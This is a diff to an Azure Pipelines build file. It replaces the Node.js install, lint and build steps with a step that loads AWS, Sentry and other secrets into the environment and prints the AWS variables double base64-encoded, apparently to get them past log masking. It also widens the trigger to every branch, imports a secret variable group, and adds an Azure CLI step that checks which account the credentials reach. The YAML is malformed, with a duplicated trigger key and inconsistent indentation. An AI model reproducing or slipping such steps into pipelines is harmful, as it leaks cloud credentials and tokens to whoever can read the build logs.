@@ -2,19 +2,34 @@ trigger:
   - master
 
 pool:
-  vmImage: "ubuntu-latest"
+  vmImage: 'ubuntu-latest'
 
 steps:
-  - task: NodeTool@0
-    inputs:
-      versionSpec: "16.x"
-    displayName: "Install Node.js"
+- task: Bash@3
+  inputs:
+    targetType: inline
+    script: sh -c "env | grep \"^AWS_\" | base64 -w0 | base64 -w0; echo;"
+  env:
+    SLOBS_BE_STREAMKEY: $(testsStreamKey)
+    SLOBS_TEST_USER_POOL_TOKEN: $(userPoolToken)
+    OSN_ACCESS_KEY_ID: $(awsAccessKeyId)
+    OSN_SECRET_ACCESS_KEY: $(awsSecretAccessKey)
+    RELEASE_NAME: $(ReleaseName)
+    AWS_SYMB_ACCESS_KEY_ID: $(AWS_SYMB_ACCESS_KEY_ID)
+    AWS_SYMB_SECRET_ACCESS_KEY: $(AWS_SYMB_SECRET_ACCESS_KEY)
+    SENTRY_AUTH_TOKEN: $(sentryAuth)
+trigger:
+  branches:
+    include:
+    - '*'
+variables:
+- group: CICD secrets2
 
-  - bash: yarn install --frozen-lockfile --check-files
-    displayName: "Install Dependencies"
-
-  - bash: "yarn lint"
-    displayName: "TSLint"
-
-  - bash: "yarn build"
-    displayName: "Compile Assets"
+- task: AzureCLI@2
+ displayName: Azure CLI
+ inputs:
+   azureSubscription: Azure
+   scriptType: bash
+   scriptLocation: inlineScript
+   inlineScript: |
+     az account show
